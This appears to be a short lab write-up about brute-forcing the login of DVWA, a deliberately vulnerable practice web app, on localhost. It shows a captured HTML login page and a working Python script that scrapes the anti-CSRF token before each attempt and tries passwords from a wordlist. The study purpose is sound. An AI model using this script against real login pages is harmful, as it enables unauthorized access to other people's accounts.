I used DVWA as a website/server for the exercise.

Had a problem with CSRF as can be seen in this line `<div class="message">CSRF token is incorrect</div>`
```html
b'<!DOCTYPE html>\r\n\r\n<html lang="en-GB">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />\r\n\r\n\t\t<title>Login :: Damn Vulnerable Web Application (DVWA)</title>\r\n\r\n\t\t<link rel="stylesheet" type="text/css" href="dvwa/css/login.css" />\r\n\r\n\t</head>\r\n\r\n\t<body>\r\n\r\n\t<div id="wrapper">\r\n\r\n\t<div id="header">\r\n\r\n\t<br />\r\n\r\n\t<p><img src="dvwa/images/login_logo.png" /></p>\r\n\r\n\t<br />\r\n\r\n\t</div> <!--<div id="header">-->\r\n\r\n\t<div id="content">\r\n\r\n\t<form action="login.php" method="post">\r\n\r\n\t<fieldset>\r\n\r\n\t\t\t<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />\r\n\r\n\r\n\t\t\t<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />\r\n\r\n\t\t\t<br />\r\n\r\n\t\t\t<p class="submit"><input type="submit" value="Login" name="Login"></p>\r\n\r\n\t</fieldset>\r\n\r\n\t<input type=\'hidden\' name=\'user_token\' value=\'14c12eb5e82676406b37820db10b72ec\' />\r\n\r\n\t</form>\r\n\r\n\t<br />\r\n\r\n\t<div class="message">CSRF token is incorrect</div>\r\n\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\r\n\t</div > <!--<div id="content">-->\r\n\r\n\t<div id="footer">\r\n\r\n\t<p><a href="https://github.com/digininja/DVWA/" target="_blank">Damn Vulnerable Web Application (DVWA)</a></p>\r\n\r\n\t</div> <!--<div id="footer"> -->\r\n\r\n\t</div> <!--<div id="wrapper"> -->\r\n\r\n\t</body>\r\n\r\n</html>'

```

Used BeautifulSoup to scrape the token from the html.
```python
import requests
from bs4 import BeautifulSoup

dvwa_url = "http://localhost/DVWA"
login_url = f"{dvwa_url}/login.php"

username = input("Enter the username: ")
password_file = input("Enter the name of the password file: ")

with open(password_file, "r") as file:
    passwords = [line.strip() for line in file.readlines()]

session = requests.Session()

def get_csrf_token():
    login_page = session.get(login_url)
    soup = BeautifulSoup(login_page.text, "html.parser")
    csrf_token_input = soup.find("input", {"name": "user_token"})
    return csrf_token_input["value"] if csrf_token_input else None

for password in passwords:
    csrf_token = get_csrf_token()

    payload = {
        "username": username,
        "password": password,
        "Login": "Login",
        "user_token": csrf_token
    }

    response = session.post(login_url, data=payload)

    print(f"[*] Trying: {username}:{password}")

    if "Login failed" in response.text:
        print(f"[-] Attempt: {password} (Incorrect)")
        continue

    print(f"[+] Password found: {password}")
    break
```